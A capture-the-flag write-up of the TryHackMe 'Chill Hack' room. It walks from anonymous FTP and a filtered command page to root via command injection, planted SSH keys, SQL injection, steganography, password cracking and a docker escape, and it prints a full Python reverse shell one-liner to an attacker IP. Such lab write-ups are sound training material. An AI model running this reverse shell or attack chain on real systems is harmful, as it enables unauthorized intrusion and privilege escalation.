# THM: Chill Hack

## Reconnaissance

The FTP server allowed for anonymous login which contained the file `note.txt`.
It mentioned some type of filtering being in place. 

![File "note.txt from FTP](screenshots/2022-11-14_12-48.png)

![Contents of note.txt](screenshots/2022-11-14_12-49.png)

Directory brute-force of the web server discovered `/secret/` which allowed for
command execution but some basic filtering is in place.

![/secret](screenshots/2022-11-14_12-54.png)

## Initial Access

I used the following python reverse shell payload to get a shell as www-data.

```
export RHOST="10.13.2.223";export RPORT=80;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

![Catching reverse shell as www-data](screenshots/2022-11-14_13-44.png)

This user can run the script `.helpline.sh` as the user apaar. Investigating
the source code you will see that the variable `msg` is being assigned with
`read` (user input) and is then used directly in a command. This allows for us 
to inject our own command such as `/bin/bash` to get a shell as the user apaar.

![Sudo -l output for www-data](screenshots/2022-11-14_13-45.png)

![Contents of helpline script](screenshots/2022-11-14_13-46.png)

![Proof of low-privilege shell](screenshots/user_proof.png)

## Privilege Escalation

Listing the listening ports you will see that port 9001 is listening locally.

![Netstat output](screenshots/2022-11-14_14-10.png)

To access port 9001 from my attacking machine I generated an ssh key pair, added
my public key to apaar's `.ssh/authorized_keys` file, and started a reverse port
forward using ssh. 

![Generating SSH keys](screenshots/2022-11-14_14-11.png)

![Add public key to apaar's authorized keys](screenshots/2022-11-14_14-13.png)

![SSH reverse port forward](screenshots/2022-11-14_14-14.png)

![Can access port 9001](screenshots/2022-11-14_14-15.png)

The login page could be bypassed with a basic SQL injection. Once logged in the
landing page hints to steganography. I downloaded the image and used `steghide`
to extract a password protected zip file that was hidden inside it. I then used
`zip2john` to generate a hash and cracked the password of the zip file. 

![Bypassing login](screenshots/2022-11-14_14-21.png)

![Landing page](screenshots/2022-11-14_14-22.png)

![Steghide](screenshots/2022-11-14_14-24.png)

![Zip2john, and cracking.](screenshots/2022-11-14_14-25.png)

The zip file contained a single file, `source_code.php`. This file contained a
username and base64 encoded password as seen below. 

![Username Anurodh in source_code.php](screenshots/2022-11-14_14-36.png)

![Base64 password in source_code.php](screenshots/2022-11-14_14-37.png)

I decoded the password and logged in as the user anurodh. This user was part of
the docker group. Referencing 
[GTFOBins](https://gtfobins.github.io/gtfobins/docker/) I found a command to
break out of restricted environments that resulted in a root shell. 

![Decoding base64 to retrieve password](screenshots/2022-11-14_14-37_1.png)

![Log in as anurodh with password](screenshots/2022-11-14_14-39.png)

![Proof of root shell](screenshots/root_proof.png)
